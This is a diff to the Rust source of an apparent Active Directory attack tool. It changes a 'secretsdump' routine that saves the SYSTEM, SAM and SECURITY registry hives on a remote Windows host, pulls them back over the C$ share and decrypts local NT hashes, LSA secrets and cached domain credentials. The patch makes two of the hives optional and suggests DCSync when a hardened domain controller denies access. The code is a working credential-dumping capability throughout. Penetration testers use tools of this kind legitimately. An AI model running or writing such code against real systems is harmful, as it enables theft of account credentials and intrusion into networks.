@@ -848,40 +848,54 @@ async fn secretsdump(a: SecretsdumpArgs) -> Result<()> {
         tracing::info!("reg save {hive}: SCM start win32 {ret}");
     }
 
-    // Pull the hives back over C$ (delete-on-close), then decrypt offline.
+    // Pull the hives back over C$ (delete-on-close), then decrypt offline. SYSTEM is required
+    // (bootkey); SAM/SECURITY are best-effort — a hardened DC can deny `reg save` of the
+    // protected hives even to LocalSystem (SeBackupPrivilege not enabled in the service token),
+    // in which case we still report what we have and point at DCSync for domain secrets.
     smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
     let system = smb
         .read_file_delete(sys_rel)
         .await
         .context("read SYSTEM hive over C$")?;
-    let sam = smb
-        .read_file_delete(sam_rel)
-        .await
-        .context("read SAM hive over C$")?;
-    let security = smb
-        .read_file_delete(sec_rel)
-        .await
-        .context("read SECURITY hive over C$")?;
+    let sam = smb.read_file_delete(sam_rel).await.ok();
+    let security = smb.read_file_delete(sec_rel).await.ok();
     eprintln!(
-        "[+] hives: SYSTEM {} B, SAM {} B, SECURITY {} B",
+        "[+] hives: SYSTEM {} B, SAM {}, SECURITY {}",
         system.len(),
-        sam.len(),
-        security.len()
+        sam.as_ref()
+            .map_or("unavailable".into(), |v| format!("{} B", v.len())),
+        security
+            .as_ref()
+            .map_or("unavailable".into(), |v| format!("{} B", v.len())),
     );
+    if sam.is_none() || security.is_none() {
+        eprintln!(
+            "[!] a protected hive was denied by the target (SeBackupPrivilege / hardening). \
+             On a DC, use `attack dcsync` for domain secrets — SAM/LSA here cover only local creds."
+        );
+    }
 
     // --- SAM: local account NT hashes ---
-    match adhammer_secrets::local_dump(&system, &sam) {
-        Ok(accounts) => {
+    match sam
+        .as_ref()
+        .map(|s| adhammer_secrets::local_dump(&system, s))
+    {
+        Some(Ok(accounts)) => {
             eprintln!("[+] {} local account(s):", accounts.len());
             for acct in accounts {
                 println!("{}", acct.secretsdump_line());
             }
         }
-        Err(e) => eprintln!("[-] SAM decrypt failed: {e}"),
+        Some(Err(e)) => eprintln!("[-] SAM decrypt failed: {e}"),
+        None => eprintln!("[*] SAM hive unavailable — skipping local accounts"),
     }
 
     // --- LSA secrets + cached domain credentials (DCC2) ---
-    match adhammer_secrets::local_lsa(&system, &security) {
+    let Some(security) = security.as_ref() else {
+        eprintln!("[*] SECURITY hive unavailable — skipping LSA secrets / DCC2");
+        return Ok(());
+    };
+    match adhammer_secrets::local_lsa(&system, security) {
         Ok(dump) => {
             eprintln!("[+] {} LSA secret(s):", dump.secrets.len());
             for s in &dump.secrets {
